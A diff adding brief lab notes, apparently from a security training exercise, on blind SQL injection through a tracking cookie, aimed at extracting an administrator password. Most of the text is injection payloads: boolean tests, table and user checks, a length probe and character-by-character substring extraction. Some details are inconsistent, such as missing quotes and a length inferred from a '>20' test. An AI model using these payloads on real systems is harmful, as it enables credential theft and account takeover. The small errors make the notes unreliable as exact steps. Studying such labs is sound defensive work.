@@ -1,0 +1,45 @@
+Blind SQLi with conditional responses.
+
+vulnerable parameter - tracking cookie.
+
+End goals:
+
+1. Enumerate password of the administrator.
+2. login as administrator user.
+
+Analysis:
+
+1. Confirm that the parameter is vulnerable to Blind SQLi.
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = 'pNV7Dm2zsDk3hIG1'
+
+-> if tracking_id exists -> query returns value -> welcome back message.
+-> if tracking_id doesn't exists -> query returns no value -> no welcome back message.
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = pNV7Dm2zsDk3hIG1' and 1=1--
+
+-> TRUE use case -> welcome back
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = pNV7Dm2zsDk3hIG1' and 1=0--
+
+-> FALSE use case -> no welcome back
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = pNV7Dm2zsDk3hIG1' and (SELECT 'x' FROM users LIMIT 1)='x'-- 
+
+-> users table exists in database.
+
+2. Confirm that username administrator exists in users table.
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = pNV7Dm2zsDk3hIG1' and (SELECT username FROM users WHERE username = 'administrator')='administrator'-- 
+
+-> administrator user exists.
+
+3. Enumerate the administrator user password.
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = pNV7Dm2zsDk3hIG1'
+and (SELECT username FROM users WHERE username = 'administrator' and LENGTH(password)>20)='administrator'-- 
+
+-> password length is 20
+
+SELECT tracking_id FROM tracking_table WHERE tracking_id = pNV7Dm2zsDk3hIG1'
+and (SELECT substring(password,2,1) FROM users WHERE username = 'administrator')='a'-- 
